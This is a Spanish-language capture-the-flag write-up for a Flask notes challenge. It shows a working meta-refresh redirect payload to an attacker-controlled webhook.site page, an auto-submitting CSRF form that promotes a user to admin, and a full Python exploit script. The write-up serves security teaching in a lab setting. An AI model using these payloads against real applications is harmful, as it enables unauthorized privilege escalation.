# CTF Dr House - Writeup

## 🏁 Flag
```
UNLP{ev3RyB0dy-L1es!!d0cT0r-h0u<3}
```

## 📋 Información del Reto

- **Nombre:** Dr House
- **Categoría:** Web
- **Autor:** kcup
- **Descripción:** "Yep another hack the admin challenge. Exploit local first, you have the source code"
- **Host:** challs.ctf.cert.unlp.edu.ar
- **Puerto:** Dinámico (Docker container)

---

## 🔍 Análisis del Código Fuente

### Estructura de la Aplicación

La aplicación es una plataforma de notas médicas construida con Flask que incluye:

- Sistema de autenticación (registro/login)
- Creación y visualización de notas
- Sistema de reportes (un bot admin visita las notas reportadas)
- Panel de administración con la flag

### Archivos Clave

1. **`app.py`** - Aplicación principal Flask
2. **`bot.py`** - Bot que simula al admin visitando notas reportadas
3. **`init_db.py`** - Inicialización de la base de datos

### Vulnerabilidad Identificada: XSS via Meta Refresh

En `app.py`, la función de sanitización usa `bleach.clean()`:

```python
def sanitize_html(content: str) -> str:
    return bleach.clean(
        content,
        tags=['b', 'i', 'u', 'em', 'strong', 'a', 'p', 'br', 'ul', 'ol', 'li', 'meta', 'blockquote'],
        attributes=['class', 'crossorigin', 'hidden', 'name', 'http-equiv', 'aria-hidden', 'content'],
        protocols=[],
        strip=True,
        strip_comments=True
    )
```

**Problema:** Permite la etiqueta `<meta>` con atributos `http-equiv` y `content`, lo que habilita **meta refresh** para redirecciones.

### El Bot Admin

El bot (`bot.py`) visita las notas reportadas autenticado como admin:

```python
def visit(self, note_id):
    url = "http://127.0.0.1:5000/"
    self.driver.get(url)
    
    # login as admin
    self.driver.find_element("name", "username").send_keys("admin")
    self.driver.find_element("name", "password").send_keys(admin_pw)
    self.driver.find_element("css selector", "button[type='submit']").click()
    time.sleep(1)
    self.driver.get(f"{url}note/{note_id}")
    time.sleep(2)
```

### Endpoint Objetivo

La flag está en `/admin` y requiere ser admin. El endpoint `/admin/make_admin/<user_id>` puede promover usuarios:

```python
@app.route('/admin/make_admin/<int:user_id>', methods=['POST'])
def make_admin(user_id):
    u = current_user()
    if not u or not u['is_admin']:
        abort(403)
    execute('UPDATE users SET is_admin = 1 WHERE id = ?', (user_id,))
```

---

## 🎯 Estrategia de Explotación

### Cadena de Ataque

1. **Registrar usuario** → Obtener `user_id` (típicamente 2, después del admin)
2. **Crear nota maliciosa** con payload XSS usando `<meta http-equiv="refresh">`
3. **Reportar la nota** → El bot admin la visita
4. **El meta refresh redirige al admin** a un servidor controlado (webhook.site)
5. **El servidor responde con HTML** que contiene un formulario CSRF auto-submit
6. **El formulario hace POST** a `/admin/make_admin/2`
7. **Nuestro usuario es promovido a admin**
8. **Acceder a `/admin`** → Ver la flag

### Payload XSS

```html
<meta http-equiv="refresh" content="0;url=https://webhook.site/YOUR-ID/">
```

### Configuración de Webhook.site

El webhook debe responder con HTML que hace CSRF:

```html
<!DOCTYPE html>
<html>
<body>
<form id="f" action="http://127.0.0.1:5000/admin/make_admin/2" method="POST"></form>
<script>document.getElementById('f').submit();</script>
</body>
</html>
```

**Configuración:**
- **Content-Type:** `text/html; charset=utf-8`
- **Status code:** `200`

---

## 🛠️ Exploit Final

```python
import requests, re, time

CTF = 'http://challs.ctf.cert.unlp.edu.ar:PUERTO'
WEBHOOK = 'https://webhook.site/YOUR-WEBHOOK-ID'

s = requests.Session()

# 1. Registrar y autenticar
s.post(f'{CTF}/register', data={'username':'hacker','password':'x'})
s.post(f'{CTF}/login', data={'username':'hacker','password':'x'})

# 2. Crear nota con payload XSS
payload = f'<meta http-equiv="refresh" content="0;url={WEBHOOK}/">'
r = s.post(f'{CTF}/notes/create', data={'title':'X','content':payload}, allow_redirects=True)
note_id = re.search(r'/note/(\d+)', r.text).group(1)

# 3. Reportar nota al admin
s.post(f'{CTF}/report', data={'note_id': note_id})

# 4. Esperar y verificar si somos admin
for i in range(15):
    time.sleep(2)
    r = s.get(f'{CTF}/admin', allow_redirects=False)
    if r.status_code == 200:
        flag = re.search(r'(UNLP\{[^}]+\})', r.text)
        if flag:
            print(f'FLAG: {flag.group(1)}')
            break
```

---

## 📝 Notas Adicionales

### Intentos Fallidos

1. **Data URI con JavaScript** - Chrome bloquea ejecución de JS desde data: URIs en meta refresh
2. **Ngrok** - La página de advertencia de ngrok interfiere con el bot
3. **Cookie stealing** - Las cookies tienen flag `HttpOnly`, no accesibles desde JS

### Por Qué Funcionó

- Los formularios HTML clásicos **no están sujetos a CORS** para POST requests
- El admin ya está autenticado cuando carga la página del webhook
- El formulario apunta a `127.0.0.1:5000` (localhost del servidor CTF)
- Al hacer submit, el POST incluye la sesión del admin y promueve nuestro usuario

### Herramientas Utilizadas

- **webhook.site** - Para recibir redirecciones y servir HTML malicioso
- **Python requests** - Para automatizar el exploit
- **Análisis de código fuente** - Para identificar la vulnerabilidad

---

## 🏆 Conclusión

Este reto demuestra una vulnerabilidad de **XSS to CSRF** donde:

1. Una sanitización incompleta permite `<meta http-equiv="refresh">`
2. Esto habilita redirecciones a sitios externos
3. Desde el sitio externo, se puede forzar al admin a ejecutar acciones sensibles (CSRF)
4. El resultado es escalación de privilegios y acceso a la flag

**Lección:** Incluso etiquetas HTML "inocentes" como `<meta>` pueden ser peligrosas si permiten redirecciones.

---

*Writeup creado el 2025-12-04*
